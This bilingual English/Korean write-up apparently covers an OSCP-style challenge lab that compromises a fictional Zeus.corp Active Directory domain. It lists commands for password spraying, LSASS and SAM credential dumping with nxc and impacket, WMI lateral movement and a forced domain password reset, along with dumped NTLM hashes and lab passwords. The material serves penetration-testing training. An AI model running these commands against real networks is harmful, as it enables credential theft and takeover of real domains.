
About this lab

The Zeus Challenge Lab covers a number of hands-on exercises embedded in different client systems within the Zeus.corp domain. Learners will compromise a client system to find to access database configurations, and intercept authentication requests. After intercepting authentication requests, learners will login to a different system with the captured ticket, then a specific document to discover cleartext credentials. The final part of this lab asks the learners to log in to the system to reset a user’s password and create a backup.

이 연구실에 대하여

Zeus 챌린지 랩은 Zeus.corp 도메인 내의 다양한 클라이언트 시스템에 내장된 여러 실습 과제를 다룹니다. 학습자는 클라이언트 시스템을 해킹하여 데이터베이스 구성에 접근하고 인증 요청을 가로채게 됩니다. 인증 요청을 가로챈 후에는 획득한 티켓을 사용하여 다른 시스템에 로그인하고, 특정 문서를 열어 평문 자격 증명을 확인합니다. 마지막으로 학습자는 시스템에 로그인하여 사용자의 비밀번호를 재설정하고 백업을 생성해야 합니다.


Lab Description
The Zeus Challenge Lab immerses learners in a series of realistic, hands-on exercises across multiple client systems within the Zeus.corp domain. Starting with system enumeration, participants will identify network vulnerabilities and compromise a client machine to extract sensitive database configurations. The challenge deepens as learners intercept authentication tickets to gain access to another system, where they’ll locate a critical document containing cleartext credentials. The final objectives involve using compromised access to reset a user's password and create a backup, simulating a full post-exploitation workflow.

제우스 챌린지 랩은 학습자가 Zeus.corp 도메인 내 여러 클라이언트 시스템에서 실제와 같은 실습 과제를 수행하도록 구성되어 있습니다. 시스템 열거부터 시작하여 네트워크 취약점을 파악하고 클라이언트 시스템을 해킹하여 민감한 데이터베이스 구성을 추출합니다. 학습자는 인증 티켓을 가로채 다른 시스템에 접근한 후, 평문 자격 증명이 포함된 중요 문서를 찾아내는 단계로 나아가며 난이도를 높입니다. 마지막 목표는 해킹된 접근 권한을 활용하여 사용자의 비밀번호를 재설정하고 백업을 생성하는 것으로, 전체 사후 공격 워크플로를 시뮬레이션하는 것입니다.

Learning Objectives

## After completing this lab, learners will be able to:

- Identify network vulnerabilities through enumeration
- Analyze database configuration security risks
- Capture and analyze network tickets to identify threats
- Reset passwords and access the system using compromised credentials
- Gather post-exploitation data and assess system compromise
## 이 실습을 완료하면 학습자는 다음을 수행할 수 있게 됩니다.

- 열거를 통해 네트워크 취약점을 식별합니다.
- 데이터베이스 구성 보안 위험을 분석합니다.
- 네트워크 티켓을 수집 및 분석하여 위협 요소를 식별합니다.
- 비밀번호를 재설정하고 유출된 자격 증명을 사용하여 시스템에 액세스합니다.
- 공격 후 데이터를 수집하고 시스템 침해 정도를 평가합니다.


Credentials
**192.168.137.158**

Challenge7 - VM 1 OS Credentials:

```
No credentials were provided for this machine
```

**192.168.137.159**

Challenge7 - VM 2 OS Credentials:

```
Eric.Wallows / EricLikesRunning800
```

**192.168.137.160**

Challenge7 - VM 3 OS Credentials:

```
No credentials were provided for this machine
```


##### 

Objectives

You have been tasked to conduct a simulated attack on the _Zeus Corp_ network. Several vulnerabilities and misconfigurations are present on the Active Directory environment, which can be leveraged by an attacker to gain access to all workstations. The final target is the Domain Controller.

Although this Challenge Lab is not a mock exam, it has been setup to use the 'Assumed Breach' scenario as seen in the OSCP+ exam. The credentials below can be used to commence your attack: Username: Eric.Wallows Password: EricLikesRunning800

##### 

목표

_귀하는 Zeus Corp_ 네트워크 에 대한 모의 공격을 수행하는 임무를 맡았습니다 . Active Directory 환경에는 여러 취약점과 잘못된 구성이 존재하며, 공격자는 이를 악용하여 모든 워크스테이션에 접근할 수 있습니다. 최종 목표는 도메인 컨트롤러입니다.

이 챌린지 랩은 모의고사는 아니지만, OSCP+ 시험에서 볼 수 있는 '보안 침해 가정' 시나리오를 사용하도록 구성되어 있습니다. 아래 자격 증명을 사용하여 공격을 시작할 수 있습니다. 사용자 이름: Eric.Wallows 비밀번호: EricLikesRunning800


# Proof of Concept
## Information Gathering

### Nmap

```bash
nmap -Pn -n --open --min-rate 3000 -oN scan 192.168.137.158-160
```
```bash
┌──(kali㉿kali)-[~/OSCP/zeus]
└─$ nmap -Pn -n --open --min-rate 3000 -oN scan 192.168.137.158-160
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-15 14:19 KST
Nmap scan report for 192.168.137.158
Host is up (0.098s latency).
Not shown: 987 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman

Nmap scan report for 192.168.137.159
Host is up (0.096s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  wsman

Nmap scan report for 192.168.137.160
Host is up (0.096s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 3 IP addresses (3 hosts up) scanned in 1.62 seconds

Nmap scan report for 192.168.137.158
Host is up (0.11s latency).
Not shown: 996 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
389/udp open  ldap

```

### Host Discovery
```bash
nxc smb 192.168.137.158-160
```

![[Pasted image 20260115142451.png]]

## 192.168.220.159 - Client01
`Eric.Wallows / EricLikesRunning800`
### Initial Access

winrm

Enumeration groups
![[Pasted image 20260115142838.png]]

Retrieve proof.txt
![[Pasted image 20260115143149.png]]

### Post-Exploitation
nxc lsassy module
```
o.foller / EarlyMorningFootball777
```

```bash
nxc smb 192.168.137.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy
```
![[Pasted image 20260115144240.png]]

```
Discovered Administrator NTLM hash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1fcb4118dfcbf52a53d6299aab57055:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
```

```bash
impacket-secretsdump Eric.Wallows:EricLikesRunning800@192.168.137.159
```
![[Pasted image 20260115145249.png]]


winrm
![[Pasted image 20260115145547.png]]

Discovered connection.sql and download
![[Pasted image 20260115145744.png]]

Extracted **database credentials** from the **`connection.sql`** file
(**`connection.sql`** 파일에서 **데이터베이스 자격 증명**을 추출)

`db_user / Password123!`

![[Pasted image 20260115145950.png]]

## 192.168.137.160 - Client02

### Lateral Movement (Client01 to Client02)

```bash
nxc smb 192.168.137.158-160 -u users.txt -p password.txt --continue-on-success -t 100
```
![[Pasted image 20260115153052.png]]

Connect Client02 via wmiexec

```bash
impacket-wmiexec o.foller:EarlyMorningFootball777@192.168.137.160 -dc-ip 192.168.137.158
```
![[Pasted image 20260115153306.png]]

**"The `whoami /all` command was used to list the enabled privileges for the current session."**
- (현재 세션에 활성화된 권한 목록을 확인하기 위해 `whoami /all` 명령어를 사용했습니다.)

![[Pasted image 20260115153952.png]]

Retrieve proof.txt
![[Pasted image 20260115154101.png]]

### Post-Exploitation
**"During the enumeration of the `/home/z.thomas` directory, a file named `Onboarding Document.docx` was identified."**

- (`/home/z.thomas/downloads` 디렉토리를 조사하던 중, `Onboarding Document.docx`라는 파일을 식별했습니다.)

```bash
smbclient //192.168.137.160/C$ -U 'zeus.corp\o.foller' --password=EarlyMorningFootball777
```
![[Pasted image 20260115164650.png]]
![[Pasted image 20260115164702.png]]


`^1+>pdRLwyct]j,CYmyi`



## 192.168.220.158 - DC01

### Lateral Movement (Client02 to DC01)
**"Successfully authenticated to DC01 using the compromised credentials of `z.thomas`."**

- (탈취한 `z.thomas`의 자격 증명을 사용하여 DC01에 대한 인증에 성공했습니다.)

```bash
nxc smb 192.168.137.158-160 -u z.thomas -p '^1+>pdRLwyct]j,CYmyi' --continue-on-success -t 100
```
![[Pasted image 20260115165133.png]]


winrm
![[Pasted image 20260115165813.png]]

Retrieve local.txt
![[Pasted image 20260115165915.png]]

### Privilege Escalation
d.chambers 계정 비밀번호를 “password123!”로 변경
```powershell
net user d.chambers password123! /domain
```
![[Pasted image 20260115170057.png]]

d.chambers 접속 후 sam,system 파일 다운로드
```powershell
reg.exe save hklm\sam sam
reg.exe save hklm\system system
```

![[Pasted image 20260115170611.png]]

Admin NTLM 해시 덤프
```bash
impacket-secretsdump -sam sam -system system LOCAL
```
![[Pasted image 20260115170730.png]]

![[Pasted image 20260115170816.png]]

Retrieve proof.txt
![[Pasted image 20260115170903.png]]